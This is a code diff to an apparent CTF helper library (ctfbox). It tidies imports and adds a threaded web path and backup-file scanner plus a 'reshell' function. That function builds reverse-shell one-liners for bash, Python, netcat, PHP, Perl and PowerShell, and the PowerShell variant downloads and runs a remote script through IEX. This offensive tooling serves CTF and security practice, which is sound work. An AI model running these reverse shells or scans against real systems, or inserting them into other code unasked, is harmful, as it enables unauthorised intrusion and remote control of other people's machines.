@@ -1,18 +1,25 @@
-from math import ceil
+from re import match
 from enum import Enum
 from functools import partial
+from hashlib import md5 as _md5
+from hashlib import sha1 as _sha1
+from hashlib import sha256 as _sha256
+from hashlib import sha512 as _sha512
 from http.server import HTTPServer
 from itertools import chain
 from json import loads
+from math import ceil
+from os import path
 from threading import Thread
-from typing import Union, List, Tuple, Dict
-from urllib.parse import quote, quote_plus
-from hashlib import md5 as _md5, sha1 as _sha1, sha256 as _sha256, sha512 as _sha512
+from typing import Dict, List, Tuple, Union
+from urllib.parse import quote, quote_plus, urljoin
+
 import requests
-from ctfbox.exceptions import (FlaskSessionHelperError, HashAuthArgumentError,
-                               ProvideArgumentError, GeneratePayloadError, HttprawError)
-from ctfbox.utils import random_string, Context, ProvideHandler, Threader
+from ctfbox.exceptions import (FlaskSessionHelperError, GeneratePayloadError,
+                               HashAuthArgumentError, HttprawError,
+                               ProvideArgumentError, ScanError)
 from ctfbox.thirdparty.phpserialize import serialize
+from ctfbox.utils import Context, ProvideHandler, Threader, random_string
 
 
 class HashType(Enum):
@@ -469,7 +476,7 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, reques
             headers["Content-Type"] = "application/json"
         if headers["Content-Type"] == "application/x-www-form-urlencoded":
             body = dict([l.split(b"=")
-                        for l in body.strip().split(b"&") if b"=" in l])
+                         for l in body.strip().split(b"&") if b"=" in l])
             body = {k.strip().decode(): v.strip().decode()
                     for k, v in body.items()}
         elif "multipart/form-data" in headers["Content-Type"]:
@@ -483,7 +490,8 @@ def httpraw(raw: Union[bytes, str], **kwargs) -> Union[requests.Response, reques
             raise HttprawError("Session invalid")
     else:
         session = requests.Session()
-    req = requests.Request(method, url, data=body, headers=headers, files=parse_dict["files"])
+    req = requests.Request(method, url, data=body,
+                           headers=headers, files=parse_dict["files"])
     prepped = req.prepare()
     if send:
         return session.send(prepped,
@@ -674,3 +682,107 @@ def soapclient_ssrf(url: str, user_agent: str = "Syclover", headers: Dict[str, s
         return quote_plus(s)
     else:
         return s
+
+
+def scan(url: str, scanList: list = [], filepath: str = "", show: bool = True, timeout: int = 60, threadNum: int = 25,) -> list:
+    """Scan for find existing network path
+
+    Args:
+        url (str): the host you want to scan
+        scanList (list, optional): the path list to scan. Defaults to [].
+        filepath (str, optional): the dictionary file path, it will be preferred. Defaults to "".
+        show (bool, optional): whether print result. Defaults to True.
+        timeout (int, optional): request timeout. Defaults to 60.
+        threadNum (int, optional): thread number. Defaults to 25.
+
+    Raises:
+        ScanError
+
+    Returns:
+        list: existing network path
+    """
+    url = url.strip()
+
+    @Threader(threadNum)
+    def run(url) -> Tuple[int, str]:
+        res = requests.get(url, timeout=timeout)
+        return res.status_code, url
+
+    if not match(r"^https?:/{2}\w.+$", url):
+        raise ScanError("Url invalid")
+
+    if filepath:
+        if path.exists(filepath):
+            with open(filepath, 'r') as f:
+                scanList = f.readlines()
+        else:
+            raise ScanError("File path invalid")
+
+    tasks = [run(urljoin(url, p.strip())) for p in scanList]
+    results = []
+
+    for task in tasks:
+        result = task.result
+        if isinstance(result, tuple):
+            status_code, url = result
+            if 200 <= status_code < 300:
+                results.append(url)
+                if show:
+                    print(url)
+    return results
+
+
+def bak_scan(url: str):
+    """A partial function of scan for backup file scanning
+
+
+    Args:
+        url (str): the host you want to scan
+
+    Returns:
+        list: existing network path
+
+    Note:
+        dictionary origin: https://github.com/kingkaki/ctf-wscan/blob/master/dict/default.txt
+    """
+    dict_path = path.join(path.split(path.realpath(__file__))[
+                          0], "../", "thirdparty", "dict", "bak.txt")
+
+    return scan(url, filepath=dict_path)
+
+
+def reshell(ip: str, port: Union[str, int], tp: str = "bash") -> str:
+    """Generate reverse shell command
+
+    Args:
+        ip (str): reverse host
+        port (Union[str, int]): reverse port
+        tp (str, optional): reverse type. Defaults to "bash".
+
+    AllowTypes:
+        bash
+        python/py
+        nc
+        php
+        perl
+        powershell/ps
+
+    Returns:
+        str: generated command
+    """
+
+    command = ""
+    if (tp == "bash"):
+        command = f"bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'"
+    elif (tp == "py" or tp == "python"):
+        command = f"""python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'"""
+    elif (tp == "nc"):
+        command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f"
+    elif (tp == "php"):
+        command = f"""php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
+    elif (tp == "perl"):
+        command = """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'""" % (
+            ip, port)
+    elif (tp == "ps" or tp == "powershell"):
+        command = """powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd'""" % (ip, port)
+    return command
